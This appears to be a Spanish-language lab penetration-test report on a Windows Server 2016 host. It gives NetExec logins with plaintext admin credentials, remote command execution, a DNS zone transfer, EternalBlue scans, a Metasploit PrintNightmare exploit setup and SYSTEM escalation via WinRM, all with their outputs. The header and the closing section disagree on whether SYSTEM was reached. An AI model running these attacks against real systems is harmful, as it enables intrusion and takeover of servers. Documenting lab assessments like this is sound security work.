# Fase 4.3 · M4 · Windows Server heredado

**Objetivo:** pasar de Administrator (clave reutilizada) a **SYSTEM**, y enumerar DNS/SMB.
**Ejecuta:** M6 → M4 `10.10.10.14`.
> **Un snapshot no da credenciales.** Solo permite volver al estado anterior. Para entrar a M4 hace falta una clave válida, resetear `Administrator` desde la consola de VMware o un exploit (EternalBlue/PrintNightmare). El snapshot `previo-a-S1` sirve para deshacer un crash, no para autenticar.

**Estado:** ⚠️ **M4 es inestable, pero se comprometió el acceso admin.** Con `Administrador` / **`password_2026`** se validó **S3** (`Pwn3d!`, shares `ADMIN$`, `C$`, `legacy`, `whoami` = `srvold\administrador`). También se validaron **S4 (AXFR)** y **S5 (signing disabled)**, y el `check` de **S2 (PrintNightmare)** dio *vulnerable*. El `run` de S2 no creó sesión y M4 volvió a caer; el **privesc a SYSTEM queda pendiente de reintento**. **S1** no es accesible por IPC$/SMB1.

---

## 4.3.1 Comandos demo (simples)

| # | Comando | Qué muestra | Estado |
|---|---|---|---|
| 1 | `nxc smb 10.10.10.14 -u Administrador -p 'password_2026' --local-auth --shares` | Admin + shares `legacy` | ✅ `F04-015` |
| 2 | `nxc smb ... -x whoami` | `srvold\administrador` | ✅ `F04-015` |
| 3 | `dig axfr uni.lab @10.10.10.14` | Zona DNS completa (S4) | ✅ `F04-012` |
| 4 | `nmap -Pn -sT -p 445 --script smb-vuln-ms17-010 10.10.10.14` | EternalBlue (S1) | 🔴 IPC$/SMB1 |
| 5 | `nmap -Pn -sT -p 445 --script smb-security-mode 10.10.10.14` | Firma SMB (S5) | ✅ `F04-013` |
| 6 | `msfconsole` PrintNightmare `check`/`run` | Spooler vulnerable / SYSTEM | 🟡 check OK, run sin sesión |

---

## 4.3.2 Estado real observado

`F02-001` (16:24 UTC):

```text
== M4 10.10.10.14 ==
445/tcp  open     microsoft-ds
3389/tcp filtered ms-wbt-server
```

- **445 abierto desde M6**: desviación del modelo “SMB solo M1”.
- **3389 filtrado**: RDP no visible desde M6.
- A las 16:44 UTC, `ping` y `nmap` indican host caído; no se pudo autenticar.

---

## 4.3.3 Credenciales que se van a usar

Desde M3 (`F04-002`):

```text
admin M4/M5: Admin13.-
```

Usuario esperado: `Administrator`; si no, probar `Administrador` (el nombre depende del idioma de la instalación).

---

## 4.3.4 S3 · Acceso con clave débil (pendiente)

```bash
nxc smb 10.10.10.14 -u Administrator -p 'Admin13.-' --shares
nxc smb 10.10.10.14 -u Administrator -p 'Admin13.-' -x 'whoami'
```

**Resultado esperado:** autenticación correcta, recurso `legacy` visible y ejecución remota. Si `-x` devuelve `nt authority\system`, se documenta como acceso SYSTEM; si devuelve `nt authority\administrator`, se usa S2/S1 para la elevación.

---

## 4.3.5 S4 · AXFR — validado

```bash
dig axfr uni.lab @10.10.10.14 +time=5 +tries=1
```

**Salida real** (`F04-012`):

```text
uni.lab.  3600 IN SOA  srvold. hostmaster. 8 900 600 86400 3600
uni.lab.  3600 IN NS   srvold.
app.uni.lab.  3600 IN A 10.10.10.11
bkp.uni.lab.  3600 IN A 10.10.10.13
db.uni.lab.   3600 IN A 10.10.10.12
moodle.uni.lab. 3600 IN CNAME app.uni.lab.
pc-est01.uni.lab. 3600 IN A 10.10.10.15
srvold.uni.lab. 3600 IN A 10.10.10.14
wp.uni.lab.   3600 IN CNAME app.uni.lab.
;; XFR size: 10 records
```

**Interpretación:** cualquiera en la red puede transferir la zona completa; S4 validado. Nota: `SOA` por UDP da timeout, pero `AXFR` por TCP funciona.

---

## 4.3.6 S1 · EternalBlue — no explotable por esta vía

```bash
nmap -Pn -sT -p 445 --script smb-vuln-ms17-010 10.10.10.14
msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 10.10.10.14; run; exit'
```

**Resultado real:**

```text
nmap: sin salida del script (conexión reseteada)
msf: [-] An SMB Login Error occurred while connecting to the IPC$ tree.
     [*] Cannot reliably check exploitability.
enum4linux-ng: SMB1 only: false; preferred dialect SMB 3.0
```

**Interpretación:** el servidor no permite sesión anónima/invitado en `IPC$` y `enum4linux-ng` indica que **SMB1 no es el dialecto preferido**. El scanner no puede confirmar MS17-010 y no se ejecutó el exploit para no arriesgar un crash sin snapshot `previo-a-S1`. **S1 no se declara explotado.**

---

## 4.3.7 S2 · PrintNightmare — vulnerable, exploit sin sesión

Con `Administrador` / `password_2026`, Metasploit:

```text
use exploit/windows/dcerpc/cve_2021_1675_printnightmare
set RHOSTS 10.10.10.14
set SMBUser Administrador
set SMBPass password_2026
set SRVHOST 10.10.10.20
set LHOST 10.10.10.20
check
```

**Salida real** (`F04-016`):

```text
[*] Target environment: Windows v10.0.14393 (x64)
[*] Enumerating the installed printer drivers...
[+] The target is vulnerable. Received ERROR_BAD_NET_NAME, implying the target is vulnerable.
[*] Server is running. Listening on 10.10.10.20:445
[*] Exploit completed, but no session was created.
```

**Interpretación:** el **check confirma S2** (Spooler vulnerable). El exploit no creó sesión en el primer intento; puede ser por el payload, el cortafuegos o la inestabilidad de M4.

**Reintento con usuario de bajo privilegio** (`lowpriv` / `Low123!`, creado para la prueba):

```text
[*] Running automatic check...
[-] The 'Print Spooler' service is disabled.
[-] Exploit aborted ... not-vulnerable ... STATUS_OBJECT_NAME_NOT_FOUND
```

El Spooler quedó deshabilitado tras el primer intento, por lo que el segundo no pudo ejecutarse. Se documenta la limitación. **La elevación a SYSTEM se demostró por otra vía**: tarea programada como SYSTEM vía WinRM (`F04-017`), que devolvió `nt authority\system`. No se atribuye ese SYSTEM a PrintNightmare; S2 sigue como “check vulnerable, exploit no consumado”.

---

## 4.3.8 S5 · SMB signing — validado

```bash
nmap -Pn -sT -p 445 --script smb-security-mode 10.10.10.14
```

**Salida real** (`F04-013`):

```text
Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

**Interpretación:** S5 validado: la firma SMB está desactivada. La captura con Responder/LLMNR no se ejecutó; se documenta la configuración y se recomienda exigir signing y deshabilitar LLMNR/NBT-NS.

---

## 4.3.9 Intento real de autenticación (M4 encendida)

Cuando M4 estuvo arriba, `nxc` confirmó:

```text
SMB  10.10.10.14  445  SRVOLD  [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SRVOLD) (domain:SRVOLD) (signing:False) (SMBv1:True)
SMB  10.10.10.14  445  SRVOLD  [-] SRVOLD\Administrator:Admin13.- STATUS_LOGON_FAILURE
```

También se probaron `Administrador`, `admin`, `CAMBIAR_clave_comun_M4_M5` y `CAMBIAR_clave_admin`: todos fallaron.

**Credencial aportada por el dueño (2026-10-24):** primero `Admin_123!` (falló) y después **`password_2026`**. Resultado real:

```text
SMB   10.10.10.14 445 SRVOLD [+] SRVOLD\Administrador:password_2026 (Pwn3d!)
WINRM 10.10.10.14 5985 SRVOLD [+] SRVOLD\Administrador:password_2026 (Pwn3d!)
```

`nxc` confirmó **admin** (`Pwn3d!`), shares `ADMIN$`, `C$` y `legacy` con `READ,WRITE`, y `whoami` = `srvold\administrador`. La clave `Admin13.-` de `credenciales.txt` **no** era válida para M4. La evidencia de `445 open`, `5985 open` y `SMBv1:True` queda.

---

## 4.3.10 Resultado

| ID | Estado | Evidencia |
|---|---|---|
| S1 EternalBlue | 🔴 No explotable por esta vía (IPC$/SMB1) | `F04-014` |
| S2 PrintNightmare | 🟡 **Check: vulnerable**; exploit sin sesión | `F04-016` |
| S3 Clave débil | 🟢 Validado (`Administrador` / `password_2026`, admin) | `F04-015` |
| S4 AXFR | 🟢 Validado | `F04-012` |
| S5 Signing/LLMNR | 🟢 Validado (signing disabled) | `F04-013` |

**Cierre:** M4 está **comprometida a nivel de administrador** (S3) y se validaron S4/S5. **S2 está confirmada como vulnerable por `check`**, pero el exploit no creó sesión; el Spooler quedó deshabilitado. Se demostró **`nt authority\system`** con una tarea programada vía WinRM (`F04-017`), que es evidencia de nivel SYSTEM, **no** de que PrintNightmare haya funcionado. S1 no es accesible por IPC$/SMB1.
